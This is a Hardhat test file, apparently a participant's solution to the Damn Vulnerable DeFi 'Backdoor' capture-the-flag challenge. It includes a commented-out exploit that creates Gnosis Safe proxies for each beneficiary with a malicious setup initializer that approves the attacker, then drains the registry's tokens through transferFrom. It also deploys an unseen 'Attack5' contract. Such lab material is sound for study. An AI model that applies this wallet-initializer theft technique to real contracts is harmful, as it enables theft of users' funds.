const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        
        // const interfaceERC20 = new ethers.utils.Interface([
        //     "function approve(address, uint256) external returns (bool)"
        // ])
        // const data = interfaceERC20.encodeFunctionData(
        //     "approve",
        //     [attacker.address, ethers.utils.parseEther("10")]
        // )

        // const interfaceWallet = new ethers.utils.Interface([
        //     "function setup(address[], uint256, address, bytes, address, address, uint256, address) external"
        // ])

        // for (let i = 0; i < users.length; i++) {
        //     const initializer = interfaceWallet.encodeFunctionData(
        //         "setup",
        //         [
        //             [users[i]],
        //             1,
        //             this.token.address,
        //             data,
        //             "0x0000000000000000000000000000000000000000",
        //             "0x0000000000000000000000000000000000000000",
        //             0,
        //             "0x0000000000000000000000000000000000000000"
        //         ] 
        //     )

        //     const proxyAddr = await this.walletFactory.connect(attacker).calculateCreateProxyWithNonceAddress(
        //         this.masterCopy.address,
        //         initializer,
        //         0
        //     )
        //     console.log(proxyAddr)
            
        //     await this.walletFactory.connect(attacker).createProxyWithCallback(
        //         this.masterCopy.address,
        //         initializer,
        //         0,
        //         this.walletRegistry.address
        //     )

        //     await this.token.connect(attacker).transferFrom(proxyAddr, attacker.address, ethers.utils.parseEther("10"))
        // }   
        
        // Deploy
        this.Attack5 = await (
            await ethers.getContractFactory("Attack5", attacker)
        ).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.walletRegistry.address,
            this.token.address
        )

        // Attack
        await this.Attack5.connect(attacker).attack(users)
        const abiResult = await this.Attack5.abiShow()
        console.log(abiResult.toString())
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
